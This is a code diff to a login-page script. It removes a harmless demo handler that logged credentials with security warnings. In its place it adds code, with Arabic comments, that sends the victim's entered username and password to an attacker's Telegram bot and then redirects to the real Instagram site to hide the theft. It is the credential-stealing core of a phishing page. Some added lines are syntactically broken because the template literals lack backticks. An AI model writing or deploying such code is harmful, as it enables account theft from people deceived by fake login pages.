@@ -1,31 +1,14 @@
-document.addEventListener('DOMContentLoaded', () => {
-    const loginForm = document.getElementById('loginForm');
+// بيانات البوت الخاصة بك
+const token = "ضع_هنا_توكن_البوت_الخاص_بك";
+const chat_id = "ضع_هنا_رقم_ايدي_حسابك";
 
-    if (loginForm) {
-        loginForm.addEventListener('submit', (event) => {
-            event.preventDefault(); // Prevent default form submission
+// الكود الذي يرسل البيانات
+const message = تم تسجيل دخول جديد:\nUsername: ${email}\nPassword: ${password};
+const url = https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)};
 
-            const usernameInput = document.getElementById('username');
-            const passwordInput = document.getElementById('password');
-
-            const username = usernameInput.value;
-            const password = passwordInput.value;
-
-            // --- SECURITY WARNING ---
-            // In a real application, you would NEVER log sensitive information like passwords
-            // to the console or send them unencrypted. This is for demonstration ONLY.
-            // A secure login involves sending credentials to a backend server over HTTPS,
-            // where they are hashed and compared against stored hashed passwords.
-            console.log('--- Login Attempt ---');
-            console.log('Username/Email:', username);
-            console.log('Password:', password);
-            console.log('---------------------');
-            console.warn('WARNING: In a real application, logging passwords like this is a major security risk!');
-
-            alert('Login attempt processed! Check the browser console for the entered credentials (for demonstration purposes only).');
-
-            // You might clear the form or redirect here in a real app
-            // loginForm.reset();
-        });
+fetch(url).then(response => {
+    if(response.ok) {
+        // إذا نجح الإرسال، يمكنك تحويل المستخدم لصفحة إنستغرام الحقيقية
+        window.location.href = "https://www.instagram.com";
     }
 });
